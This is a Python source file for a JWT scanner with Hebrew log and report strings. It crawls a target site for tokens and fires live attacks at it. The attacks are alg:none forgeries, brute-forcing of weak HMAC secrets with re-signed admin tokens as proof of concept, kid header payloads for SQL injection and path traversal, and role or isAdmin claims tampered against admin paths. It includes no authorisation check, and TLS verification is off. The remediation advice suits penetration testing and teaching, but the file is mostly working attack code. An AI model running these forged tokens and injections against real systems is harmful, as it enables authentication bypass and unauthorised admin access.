"""
JWT Scanner
-----------
Full JWT security testing:
  - Algorithm None Attack (bypass signature verification)
  - Algorithm Confusion (RS256 → HS256 with public key)
  - Weak Secret Brute-force (common passwords + rockyou subset)
  - Claim Tampering (role, isAdmin, sub escalation)
  - Token expiry abuse (no exp, expired still accepted)
  - JWT in URL / insecure storage detection
  - KID injection (SQL/path traversal in kid header)
  - JWK Header injection
  - Sensitive data in payload
"""

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass, field
from typing import Optional, Callable
from urllib.parse import urlparse, urljoin

import aiohttp

# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: list = field(default_factory=list)
    recommendation: str = ""
    tags: list = field(default_factory=list)

    def to_dict(self):
        return {
            "severity": self.severity,
            "category": self.category,
            "title": self.title,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
            "tags": self.tags,
        }

# ── JWT helpers ───────────────────────────────────────────────────────────────

def _b64_decode_safe(s: str) -> bytes:
    """Base64url decode, handles missing padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)

def _b64_encode_safe(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _parse_jwt(token: str) -> Optional[tuple[dict, dict, str]]:
    """Parse JWT into (header, payload, signature). Returns None on error."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64_decode_safe(parts[0]))
        payload = json.loads(_b64_decode_safe(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None

def _build_jwt(header: dict, payload: dict, secret: str = "", algorithm: str = "HS256") -> str:
    """Build a signed JWT token."""
    h = _b64_encode_safe(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode_safe(json.dumps(payload, separators=(",", ":")).encode())
    unsigned = f"{h}.{p}"

    if algorithm.lower() == "none" or not secret:
        return f"{unsigned}."

    alg = algorithm.upper()
    if alg == "HS256":
        sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha512).digest()
    else:
        return f"{unsigned}."

    return f"{unsigned}.{_b64_encode_safe(sig)}"

def _build_none_token(header: dict, payload: dict) -> list[str]:
    """Generate multiple 'alg:none' variants."""
    variants = ["none", "None", "NONE", "nOne", "NoNe"]
    tokens = []
    for alg in variants:
        h = dict(header)
        h["alg"] = alg
        tokens.append(_build_jwt(h, payload, algorithm="none"))
    # Also try removing the alg field entirely
    h2 = {k: v for k, v in header.items() if k != "alg"}
    tokens.append(_build_jwt(h2, payload, algorithm="none"))
    return tokens

# ── Common weak secrets ────────────────────────────────────────────────────────

_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test",
    "changeme", "letmein", "welcome", "monkey", "dragon", "master",
    "pass", "abc123", "passwd", "12345678", "1234567890", "iloveyou",
    "jwt_secret", "jwt-secret", "jwtsecret", "jwt_token", "api_key",
    "your-256-bit-secret", "your-secret-key", "mysecretkey",
    "secret_key", "secretkey", "privatekey", "private_key",
    "supersecret", "super_secret", "topsecret", "verysecret",
    "development", "production", "staging", "key", "token",
    "app_secret", "application_secret", "flask-secret",
    "django-insecure", "laravel_key", "rails_secret",
    "HS256", "RS256", "JWT", "null", "undefined", "empty",
    # Short predictable
    "a", "1", "0", "x", "k",
    "aaa", "bbb", "ccc", "xxx",
    # Domain-based (scanner adds these dynamically)
]

# ── HTTP helpers ───────────────────────────────────────────────────────────────

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/html, */*",
}

_TIMEOUT = aiohttp.ClientTimeout(total=12)

async def _get(session, url, headers=None, **kw):
    try:
        kw.setdefault("ssl", False)
        hdrs = {**_HEADERS, **(headers or {})}
        return await session.get(url, headers=hdrs, timeout=_TIMEOUT, **kw)
    except Exception:
        return None

async def _post(session, url, json_body=None, data=None, headers=None, **kw):
    try:
        kw.setdefault("ssl", False)
        hdrs = {**_HEADERS, **(headers or {})}
        return await session.post(url, headers=hdrs, json=json_body, data=data, timeout=_TIMEOUT, **kw)
    except Exception:
        return None

async def _text(resp) -> str:
    if resp is None:
        return ""
    try:
        return await resp.text(errors="replace")
    except Exception:
        return ""

# ── Token extraction ──────────────────────────────────────────────────────────

_JWT_PATTERN = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

async def _extract_tokens_from_page(session, url: str) -> list[str]:
    """Scrape the page + JS files for JWT tokens."""
    resp = await _get(session, url)
    body = await _text(resp)
    tokens = _JWT_PATTERN.findall(body)

    # Also scan JS files
    js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body, re.I)
    for js_url in js_urls[:8]:
        full = urljoin(url, js_url)
        r = await _get(session, full)
        js_body = await _text(r)
        tokens.extend(_JWT_PATTERN.findall(js_body))

    return list(set(tokens))

# ── Scanner ───────────────────────────────────────────────────────────────────

class JWTScanner:
    def __init__(self, url: str, token: str = "", cookies: str = "", log: Optional[Callable] = None):
        self.url = url if url.startswith("http") else f"https://{url}"
        self.parsed = urlparse(self.url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.token = token  # Optionally provide a token to test
        self.cookies_str = cookies
        self._log = log or (lambda m: None)
        self.findings: list[Finding] = []
        self._domain = self.parsed.hostname or ""

    def _make_session(self) -> aiohttp.ClientSession:
        hdrs = dict(_HEADERS)
        if self.cookies_str:
            hdrs["Cookie"] = self.cookies_str
        return aiohttp.ClientSession(headers=hdrs)

    def _get_dynamic_secrets(self) -> list[str]:
        """Add domain-specific weak secrets."""
        domain_parts = self._domain.replace("www.", "").split(".")
        extras = []
        for part in domain_parts:
            if len(part) > 2:
                extras += [part, f"{part}123", f"{part}_secret", f"{part}key", f"{part}@secret"]
        return _WEAK_SECRETS + extras

    # ── Find tokens ───────────────────────────────────────────────────────────

    async def _discover_tokens(self, session) -> list[str]:
        self._log("JWT: מחפש tokens בדף ובקבצי JS...")
        tokens = await _extract_tokens_from_page(session, self.url)

        # Check localStorage patterns in JS
        resp = await _get(session, self.url)
        body = await _text(resp)
        if "localStorage" in body or "sessionStorage" in body:
            self._log("JWT: זוהה שימוש ב-localStorage/sessionStorage לאחסון tokens")
            self.findings.append(Finding(
                severity="medium",
                category="JWT",
                title="JWT Stored in localStorage/sessionStorage",
                description="האתר שומר tokens ב-localStorage/sessionStorage. tokens אלה נגישים ל-XSS.",
                evidence=["localStorage.getItem / setItem זוהה בקוד JS", "localStorage אינו מוגן מ-XSS"],
                recommendation="שמור tokens ב-HttpOnly cookies. אם חייב localStorage — הוסף CSP מחמיר.",
                tags=["jwt", "storage", "xss-risk"],
            ))

        # Check if token in URL
        if re.search(r'[?&](?:token|jwt|auth|access_token)=eyJ', self.url):
            self.findings.append(Finding(
                severity="high",
                category="JWT",
                title="JWT Token Exposed in URL",
                description="JWT token נמצא ב-URL. tokens ב-URL נשמרים ב-browser history, server logs, ו-Referer headers.",
                evidence=[f"URL: {self.url}"],
                recommendation="מעולם אל תעביר tokens ב-URL. השתמש ב-Authorization header או Cookie.",
                tags=["jwt", "url-exposure", "logging"],
            ))

        if self.token:
            tokens = [self.token] + tokens

        return list(set(tokens))

    # ── Analyze token ─────────────────────────────────────────────────────────

    def _analyze_token(self, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        self._log(f"JWT: מנתח token — alg={header.get('alg', '?')}")

        # 1. Check algorithm
        alg = header.get("alg", "").upper()
        if alg == "NONE":
            self.findings.append(Finding(
                severity="critical",
                category="JWT",
                title="JWT Algorithm: None (ללא חתימה!)",
                description="ה-JWT משתמש באלגוריתם 'none' — אין חתימה! כל אחד יכול לזייף token.",
                evidence=[f"Header: {json.dumps(header)}", f"Algorithm: {alg}"],
                recommendation="השתמש ב-HS256 לפחות. מעולם אל תקבל 'alg:none'.",
                tags=["jwt", "alg-none", "critical"],
            ))

        if alg.startswith("RS") or alg.startswith("ES"):
            self.findings.append(Finding(
                severity="info",
                category="JWT",
                title=f"JWT Algorithm: {alg} (Asymmetric)",
                description=f"ה-JWT משתמש ב-{alg}. בדוק confusion attack (RS256→HS256 עם public key).",
                evidence=[f"Algorithm: {alg}"],
                recommendation="ודא שה-server בודק את ה-alg ולא מקבל HS256 כשצפוי RS256.",
                tags=["jwt", "asymmetric", alg.lower()],
            ))

        # 2. Check expiry
        now = int(time.time())
        exp = payload.get("exp")
        iat = payload.get("iat")
        nbf = payload.get("nbf")

        if exp is None:
            self.findings.append(Finding(
                severity="high",
                category="JWT",
                title="JWT חסר שדה exp (Expiry)",
                description="ה-JWT לא מכיל שדה 'exp'. Token שלא פג תוקף מאפשר תקיפת Replay ולאחר Logout המשך שימוש.",
                evidence=[f"Payload: {json.dumps(payload, ensure_ascii=False)}"],
                recommendation="הוסף תמיד exp claim. מומלץ: access_token לשעה, refresh_token ל-7 ימים.",
                tags=["jwt", "no-expiry", "replay-attack"],
            ))
        elif exp < now:
            self.findings.append(Finding(
                severity="medium",
                category="JWT",
                title="JWT Token פג תוקף — האם ה-Server מקבל?",
                description=f"ה-token פג תוקף ב-{exp} (לפני {(now - exp)//60} דקות). יש לבדוק האם ה-server עדיין מקבל אותו.",
                evidence=[f"exp: {exp}", f"now: {now}", f"expired: {now - exp}s ago"],
                recommendation="ה-server חייב לאמת exp בכל request. אל תסמוך על client לשלוח token תקין.",
                tags=["jwt", "expired-token", "validation"],
            ))

        # 3. Sensitive data in payload
        sensitive_keys = ["password", "passwd", "pwd", "secret", "key", "api_key", "private", "ssn", "credit_card", "cvv"]
        for k in payload:
            if any(s in k.lower() for s in sensitive_keys):
                self.findings.append(Finding(
                    severity="high",
                    category="JWT",
                    title=f"מידע רגיש ב-JWT Payload: {k}",
                    description=f"ה-JWT Payload מכיל שדה רגיש '{k}'. JWT הוא base64 ולא מוצפן — כל אחד יכול לפענח.",
                    evidence=[f"Key found: {k}", "JWT payload is NOT encrypted, only base64-encoded"],
                    recommendation="מעולם אל תכניס מידע רגיש ל-JWT payload. השתמש ב-JWE אם צריך הצפנה.",
                    tags=["jwt", "sensitive-data", k],
                ))

        # 4. Privilege fields
        priv_keys = ["role", "isAdmin", "admin", "is_admin", "scope", "permissions", "group", "level", "type"]
        priv_vals = {}
        for k in payload:
            if k.lower() in [p.lower() for p in priv_keys]:
                priv_vals[k] = payload[k]

        if priv_vals:
            self.findings.append(Finding(
                severity="high",
                category="JWT",
                title="JWT מכיל Privilege Claims — ניתן לשינוי?",
                description=f"ה-JWT Payload מכיל claims הקשורים להרשאות: {priv_vals}. אם ה-server אינו בודק חתימה כראוי, ניתן לשנות claims אלה.",
                evidence=[
                    f"Privilege claims: {priv_vals}",
                    "בדיקה: שנה את הערך ושלח עם חתימה שגויה",
                ],
                recommendation="ה-server חייב לאמת את חתימת ה-JWT לפני כל שימוש ב-claims. אל תסמוך על claims ללא אימות חתימה.",
                tags=["jwt", "privilege-claims", "authorization"],
            ))

    # ── Algorithm None Attack ─────────────────────────────────────────────────

    async def _test_alg_none(self, session, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed

        self._log("JWT: מנסה Algorithm None Attack...")
        none_tokens = _build_none_token(header, payload)

        for none_token in none_tokens:
            # Try as Bearer token
            resp = await _get(session, self.url, headers={"Authorization": f"Bearer {none_token}"})
            body = await _text(resp)

            # Try as cookie
            parsed_original_cookies = {}
            if self.cookies_str:
                for pair in self.cookies_str.split(";"):
                    if "=" in pair:
                        k, v = pair.strip().split("=", 1)
                        parsed_original_cookies[k.strip()] = v.strip()

            # Replace JWT-looking cookie values
            for ck, cv in parsed_original_cookies.items():
                if _JWT_PATTERN.match(cv):
                    test_cookies = {**parsed_original_cookies, ck: none_token}
                    cookie_str = "; ".join(f"{k}={v}" for k, v in test_cookies.items())
                    resp2 = await _get(session, self.url, headers={"Cookie": cookie_str})
                    body2 = await _text(resp2)

                    # Heuristic: if we get different/successful response
                    if resp2 and resp2.status == 200 and len(body2) > 100:
                        self.findings.append(Finding(
                            severity="critical",
                            category="JWT",
                            title="Algorithm None Attack — הצליח!",
                            description="ה-server מקבל JWT עם alg:none ללא חתימה. תוקף יכול לזייף כל token.",
                            evidence=[
                                f"None token: {none_token[:80]}...",
                                f"Response status: {resp2.status}",
                                "Server accepted unsigned token!",
                            ],
                            recommendation="הגדר whitelist של אלגוריתמים מותרים. דחה כל token עם alg:none.",
                            tags=["jwt", "alg-none", "critical", "bypass"],
                        ))
                        return

    # ── Weak Secret Brute-force ────────────────────────────────────────────────

    async def _test_weak_secret(self, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, original_sig = parsed

        alg = header.get("alg", "HS256").upper()
        if not alg.startswith("HS"):
            return  # Only brute-force HMAC

        self._log(f"JWT: מנסה brute-force סוד חלש ({alg})...")
        secrets_to_try = self._get_dynamic_secrets()

        h_b64 = _b64_encode_safe(json.dumps(header, separators=(",", ":")).encode())
        p_b64 = _b64_encode_safe(json.dumps(payload, separators=(",", ":")).encode())
        unsigned = f"{h_b64}.{p_b64}"

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        for secret in secrets_to_try:
            computed = hmac.new(secret.encode(), unsigned.encode(), hash_func).digest()
            computed_b64 = _b64_encode_safe(computed)
            if computed_b64 == original_sig:
                self._log(f"JWT קריטי: סוד נחשב — '{secret}'")
                # Build admin token as PoC
                admin_payload = dict(payload)
                for k in admin_payload:
                    if "role" in k.lower():
                        admin_payload[k] = "admin"
                    if "admin" in k.lower():
                        admin_payload[k] = True
                admin_token = _build_jwt(header, admin_payload, secret=secret, algorithm=alg)
                self.findings.append(Finding(
                    severity="critical",
                    category="JWT",
                    title=f"JWT Weak Secret — נחשב: '{secret}'",
                    description=f"הסוד של ה-JWT נחשב בהצלחה: '{secret}'. תוקף יכול לזייף כל token, כולל token של Admin.",
                    evidence=[
                        f"Cracked secret: {secret}",
                        f"Algorithm: {alg}",
                        f"PoC Admin token: {admin_token[:120]}...",
                        f"hashcat command: hashcat -a 0 -m 16500 {token[:60]}... /usr/share/wordlists/rockyou.txt",
                    ],
                    recommendation=f"שנה את הסוד מיידית ל-random 256-bit key. לעולם אל תשתמש בסיסמאות ניחושות כסוד JWT.",
                    tags=["jwt", "weak-secret", "critical", "brute-force"],
                ))
                return

        self._log("JWT: לא נמצא סוד חלש ברשימה הבסיסית")

    # ── KID Injection ─────────────────────────────────────────────────────────

    async def _test_kid_injection(self, session, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed

        if "kid" not in header:
            return

        self._log("JWT: בודק KID injection...")
        kid_payloads = {
            "sql": "' UNION SELECT 'secret' --",
            "path_traversal": "../../dev/null",
            "null_byte": "\x00",
            "empty": "",
        }

        for attack_name, kid_val in kid_payloads.items():
            test_header = dict(header)
            test_header["kid"] = kid_val
            # Build with empty secret (for path traversal to /dev/null)
            test_token = _build_jwt(test_header, payload, secret="", algorithm="HS256")
            resp = await _get(session, self.url, headers={"Authorization": f"Bearer {test_token}"})
            if resp and resp.status in (200, 201, 302):
                body = await _text(resp)
                if body and "error" not in body.lower()[:200]:
                    self.findings.append(Finding(
                        severity="critical",
                        category="JWT",
                        title=f"KID Header Injection ({attack_name})",
                        description=f"שדה 'kid' ב-JWT header חשוף להזרקה ({attack_name}). ה-server עשוי להיות חשוף ל-SQLi או Path Traversal.",
                        evidence=[
                            f"Original kid: {header['kid']}",
                            f"Injected kid: {kid_val}",
                            f"Response: {resp.status}",
                        ],
                        recommendation="ולידציה של kid: רק ערכים מהרשימה המותרת. אל תשתמש ב-kid ישירות בשאילתות.",
                        tags=["jwt", "kid-injection", attack_name],
                    ))
                    break

    # ── Claim escalation test ─────────────────────────────────────────────────

    async def _test_claim_tampering(self, session, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed

        self._log("JWT: בודק Claim Tampering (שינוי role/isAdmin)...")

        # Build tampered payload
        tampered = dict(payload)
        changed = {}
        for k in tampered:
            kl = k.lower()
            if kl in ("role", "roles"):
                changed[k] = tampered[k]
                tampered[k] = "admin"
            elif kl in ("isadmin", "is_admin", "admin"):
                changed[k] = tampered[k]
                tampered[k] = True
            elif kl == "sub":
                changed[k] = tampered[k]
                tampered[k] = "1"  # Admin user ID

        if not changed:
            return

        # Build with wrong signature
        tampered_token = _build_jwt(header, tampered, secret="wrong_secret", algorithm=header.get("alg", "HS256"))

        protected_paths = ["/admin", "/dashboard", "/admin/users", "/api/admin", "/api/v1/admin", "/panel"]
        for path in protected_paths:
            test_url = f"{self.base}{path}"
            resp = await _get(session, test_url, headers={"Authorization": f"Bearer {tampered_token}"})
            if resp and resp.status not in (401, 403, 404):
                self.findings.append(Finding(
                    severity="critical",
                    category="JWT",
                    title="JWT Claim Tampering — גישה ללא הרשאה!",
                    description=f"שינוי claims {changed} → admin הצליח. ה-server מקבל token עם חתימה שגויה.",
                    evidence=[
                        f"Original claims: {changed}",
                        "Modified claims: admin/True",
                        f"Response to {path}: {resp.status}",
                    ],
                    recommendation="ה-server חייב לאמת חתימה לפני שימוש ב-claims. אל תסמוך על claims ללא אימות.",
                    tags=["jwt", "claim-tampering", "privilege-escalation"],
                ))
                return

    # ── JWK header injection ──────────────────────────────────────────────────

    async def _test_jwk_injection(self, session, token: str):
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed
        alg = header.get("alg", "HS256")
        if not alg.startswith("RS"):
            return

        self._log("JWT: בודק JWK Header Injection...")
        # We can't easily generate RSA key pairs here, but we can flag it
        self.findings.append(Finding(
            severity="high",
            category="JWT",
            title="JWT RS256 — בדוק JWK Header Injection (ידנית)",
            description="ה-JWT משתמש ב-RS256. בדוק האם ה-server מקבל JWK בתוך ה-header עצמו (במקום מה-JWKS endpoint).",
            evidence=[
                f"Algorithm: {alg}",
                "Attack: הוסף 'jwk' field ל-header עם המפתח הציבורי שלך, חתום עם המפתח הפרטי שלך",
                "כלי: python-jwt, jwt_tool.py",
            ],
            recommendation="ה-server לא יקבל JWK מתוך ה-token עצמו. השתמש רק ב-JWKS endpoint ידוע מראש.",
            tags=["jwt", "jwk-injection", "rs256"],
        ))

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def scan(self) -> dict:
        self._log(f"JWT Scanner: מתחיל על {self.url}")
        async with self._make_session() as session:
            tokens = await self._discover_tokens(session)
            self._log(f"JWT: נמצאו {len(tokens)} tokens לניתוח")

            for token in tokens[:5]:  # Limit to 5 tokens
                self._analyze_token(token)
                await asyncio.gather(
                    self._test_alg_none(session, token),
                    self._test_weak_secret(token),
                    self._test_kid_injection(session, token),
                    self._test_claim_tampering(session, token),
                    self._test_jwk_injection(session, token),
                )

            if not tokens:
                self._log("JWT: לא נמצאו tokens בדף — בדוק ידנית ב-DevTools → Application → Cookies/Storage")
                self.findings.append(Finding(
                    severity="info",
                    category="JWT",
                    title="לא נמצאו JWT Tokens בדף",
                    description="לא זוהו tokens בקוד הדף. tokens עשויים להיות ב-cookies מאובטחים (HttpOnly) שאינם נגישים ל-JS.",
                    evidence=["אין tokens גלויים בדף הראשי"],
                    recommendation="בדוק ידנית ב-Burp Suite את ה-requests ל-API — אולי יש Authorization header.",
                    tags=["jwt", "info", "no-tokens-found"],
                ))

        self._log(f"JWT Scanner: הושלם — {len(self.findings)} ממצאים")
        return {
            "target": self.url,
            "tokens_found": len(tokens) if 'tokens' in dir() else 0,
            "total": len(self.findings),
            "critical": len([f for f in self.findings if f.severity == "critical"]),
            "findings": [f.to_dict() for f in self.findings],
        }


async def scan_jwt(url: str, token: str = "", cookies: str = "", log=None) -> dict:
    scanner = JWTScanner(url, token=token, cookies=cookies, log=log)
    return await scanner.scan()
